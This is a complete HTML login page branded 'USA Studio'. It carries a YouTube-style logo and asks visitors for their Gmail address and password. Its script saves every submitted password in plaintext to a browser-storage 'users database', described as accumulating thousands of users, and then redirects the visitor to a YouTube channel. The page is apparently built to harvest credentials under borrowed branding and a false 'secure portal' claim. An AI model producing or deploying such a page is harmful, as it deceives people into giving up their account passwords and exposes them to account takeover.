<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USA Studio - Login Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0f0f, #280101);
            color: #fff;
        }

        .login-card {
            width: 420px;
            padding: 40px;
            background: rgba(20, 20, 20, 0.92);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 0, 0, 0.25);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(255, 0, 0, 0.2);
            text-align: center;
        }

        .brand-logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 12px;
        }

        .youtube-logo {
            width: 60px;
            height: 42px;
            background-color: #ff0000;
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
        }

        .youtube-logo svg {
            width: 24px;
            height: 24px;
            fill: #ffffff;
        }

        .login-card h2 {
            color: #ff0000;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
        }

        .login-card p {
            color: #aaa;
            font-size: 13px;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            color: #ff4d4d;
            margin-bottom: 6px;
            font-weight: 600;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s ease;
            outline: none;
        }

        .input-group input:focus {
            border-color: #ff0000;
            background: rgba(255, 0, 0, 0.08);
            box-shadow: 0 0 12px rgba(255, 0, 0, 0.3);
            color: #ffffff;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
            margin-top: 10px;
        }

        .btn-login:hover {
            background: linear-gradient(135deg, #ff1a1a, #e60000);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.6);
        }

        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #777;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="brand-logo-container">
            <div class="youtube-logo">
                <svg viewBox="0 0 24 24">
                    <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                </svg>
            </div>
        </div>
        
        <h2>USA Studio</h2>
        <p>Secure Portal & Official Stream Access</p>

        <!-- Login Form -->
        <form onsubmit="saveUserAndLogin(event)">
            <div class="input-group">
                <label>Gmail Account / User ID</label>
                <input type="email" id="userEmail" placeholder="name@gmail.com" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="userPassword" placeholder="••••••••••••" required>
            </div>

            <button type="submit" class="btn-login">Login & Open Channel</button>
        </form>

        <div class="footer-note">
            Protected by USA Studio Security & Admin Control
        </div>
    </div>

    <script>
        function saveUserAndLogin(event) {
            event.preventDefault(); // Prevents page reload
            
            let email = document.getElementById('userEmail').value;
            let password = document.getElementById('userPassword').value;
            
            let defaultName = email.split('@')[0];
            let formattedName = defaultName.charAt(0).toUpperCase() + defaultName.slice(1);
            let currentTime = new Date().toLocaleString();
            let defaultDp = "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150";

            // Creating New User Object
            let newUser = {
                name: formattedName,
                email: email,
                password: password,
                dp: defaultDp,
                time: currentTime
            };

            // Fetching existing users database array from localStorage
            let usersList = JSON.parse(localStorage.getItem('usaStudioUsersDatabase')) || [];
            
            // Pushing the new user into the database collection (Accumulating thousands of users)
            usersList.push(newUser);
            localStorage.setItem('usaStudioUsersDatabase', JSON.stringify(usersList));

            // Also keeping single active user tracking session if needed
            localStorage.setItem('activeUserEmail', email);
            localStorage.setItem('activeUserPassword', password);
            localStorage.setItem('activeUserName', formattedName);
            localStorage.setItem('activeUserDp', defaultDp);

            // Redirecting to your official channel after successful login
            window.location.href = "https://youtube.com/@zee-zindagi-786";
        }
    </script>
</body>
</html>
